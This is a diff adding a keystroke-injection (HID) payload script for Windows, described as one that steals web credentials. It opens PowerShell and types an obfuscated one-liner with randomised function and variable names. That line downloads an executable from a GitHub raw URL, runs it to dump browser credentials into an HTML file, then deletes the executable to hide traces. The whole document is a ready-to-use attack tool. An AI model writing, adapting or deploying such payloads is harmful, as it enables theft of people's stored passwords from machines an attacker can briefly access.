@@ -1,0 +1,24 @@
+# Title: 		Cryptographic Payload - Web
+# Description:	steals web credentials
+# Author:		Blue Cosmo
+# Category:	    credentials
+# Target:		Windows *
+# Attackmodes:	HID, STORGAGE
+
+# attackmodes 
+LED SETUP
+ATTACKMODE HID STORGAGE
+GET SWITCH_POSITION
+
+# open powershell
+LED STAGE1
+RUN WIN powershell
+QUACK DELAY 400
+
+# execute powershell
+LED STAGE2
+QUACK STRING function uCmLBUkWvE { return -join ((65..90) + (97..122) | Get-Random -Count 10 | ForEach-Object {[char]$_}) }; $TcDrgEHOCo = uCmLBUkWvE; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/AlexKollar/Cryptex/master/payloads/web/web.exe' -OutFile "$TcDrgEHOCo.exe"; $zXMpyWDQjY = uCmLBUkWvE; Invoke-Expression "./$TcDrgEHOCo.exe /shtml $zXMpyWDQjY.html";Start-Sleep 2; Remove-Item "$TcDrgEHOCo.exe"; exit;
+QUACK ENTER
+
+# finish
+LED FINISH
